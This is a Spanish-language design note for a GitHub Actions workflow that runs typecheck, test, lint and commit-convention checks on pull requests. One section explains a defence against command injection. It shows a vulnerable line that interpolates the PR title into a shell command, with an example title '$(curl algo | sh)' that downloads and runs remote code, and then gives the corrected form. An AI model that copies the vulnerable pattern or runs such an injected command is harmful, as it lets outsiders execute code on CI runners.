## Context

Ver [proposal.md](proposal.md) — Why. Los cuatro comandos que el workflow va a ejecutar ya existen y ya pasan; este change no escribe código de producto, solo la infraestructura que los invoca en cada PR.

Dos hechos del repositorio dan forma al diseño:

- **Solo se permite squash**, con el título del PR como mensaje de commit. Lo que hay que validar es el título, y nada más.
- **El issue #6 marcará checks como obligatorios.** El nombre de cada job es el nombre del check que #6 tendrá que seleccionar, así que los nombres son una decisión de interfaz, no de estilo.

Verificado antes de diseñar: `npm ci` completa en ~1.3 s y los cuatro comandos pasan sobre un clon limpio; el `package-lock.json` incluye las variantes de plataforma de los binarios nativos (19 de oxlint, 20 de TypeScript), así que la instalación no depende del sistema del runner.

## Goals / Non-Goals

**Goals:**

- Que ningún PR pueda entrar en rojo sin que se vea.
- Dejar cuatro checks con nombres estables que el issue #6 pueda marcar como obligatorios.
- Que el workflow no invente comandos: si algo hay que verificar, primero existe como script de npm y se puede correr en local.

**Non-Goals:**

- Optimizar el tiempo de ejecución. Con instalaciones de un segundo y pruebas de milisegundos, no hay nada que optimizar todavía.

## Decisions

### Cuatro jobs, no un job con cuatro pasos

Un job con pasos produce **un** check: si se pone rojo, hay que abrir los logs para saber qué falló, y el issue #6 solo podría exigir "todo o nada".

Cuatro jobs producen cuatro checks con nombre propio (`typecheck`, `test`, `lint`, `commit-convention`), visibles de un vistazo en el PR y seleccionables individualmente en la protección de rama. Corren en paralelo, así que además terminan antes.

`format:check` va **dentro** del job `lint` en vez de en uno propio: son la misma preocupación —higiene del código— y separarlos daría un quinto check que nunca falla solo.

### El título del PR entra por variable de entorno

Esto es seguridad, no estilo. El título lo escribe quien abre el PR, y en un repositorio público eso es cualquiera:

```yaml
# Vulnerable: un PR titulado  $(curl algo | sh)  se ejecuta en el runner
run: echo "${{ github.event.pull_request.title }}" | npx commitlint

# Correcto: el título es un dato, no parte del comando
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "$PR_TITLE" | npx commitlint
```

La interpolación `${{ }}` sustituye texto **antes** de que el shell exista, así que el contenido del título se vuelve comando. Por variable de entorno, el shell lo trata como valor.

### commitlint con la configuración del repositorio, no una acción de terceros

Hay acciones publicadas que validan títulos de PR contra Conventional Commits. Se descartan por dos motivos: usarían **sus** reglas en vez de las nuestras (tipos en español, `subject-case` desactivado, encabezado de 100), y añadirían una dependencia de terceros con acceso al runner para algo que `npx commitlint` ya hace.

Una sola fuente de verdad: `commitlint.config.js`, la misma que valida el hook local.

### Disparo en `pull_request` y en `push` a `main`

Un workflow que solo corre en `pull_request` deja el badge sin estado que mostrar, porque el badge refleja la última ejecución en la rama por defecto. Con el disparo en `push` a `main` el badge dice la verdad sobre `main`, que es lo que un visitante quiere saber.

El job `commit-convention` se salta en `push` — ahí no hay título de PR que validar.

### La versión de Node se fija explícita en el workflow

`actions/setup-node` puede leer la versión desde `package.json`, pero nuestro `engines.node` es un **rango** (`>=24`) y se resolvería a la última disponible: el CI cambiaría de versión de Node sin que nadie lo decida, y una publicación de Node ajena al proyecto podría poner un PR en rojo.

Se fija `24` en el workflow, con un comentario que apunta a `engines`. Es una duplicación de una línea, documentada, a cambio de ejecuciones deterministas.

### Higiene del workflow

`concurrency` con `cancel-in-progress` para que empujar tres veces seguidas a un PR no deje tres ejecuciones compitiendo; `permissions: contents: read` porque ningún job escribe nada; `timeout-minutes` como red ante un cuelgue.

## Risks / Trade-offs

- **El badge depende del nombre del archivo del workflow** → renombrar `pr-gates.yml` rompe la imagen del README en silencio. Queda anotado en el propio README.
- **`npm ci` falla si `package.json` y el lock divergen** → es deseable: es la señal de que alguien editó dependencias sin instalar. Vale la pena saberlo porque el mensaje de error de `npm ci` no es evidente la primera vez.
- **El job `test` ejecuta el compilador dos veces** (las pruebas de frontera lo lanzan sobre los fixtures) → hoy son segundos; si creciera, la salida es cachear o mover esas pruebas a su propio job.
- **Cuatro jobs pagan cuatro veces el arranque y la instalación** → con `npm ci` en ~1.3 s el coste es despreciable, y se compensa con el paralelismo. Si dejara de serlo, se consolidan.
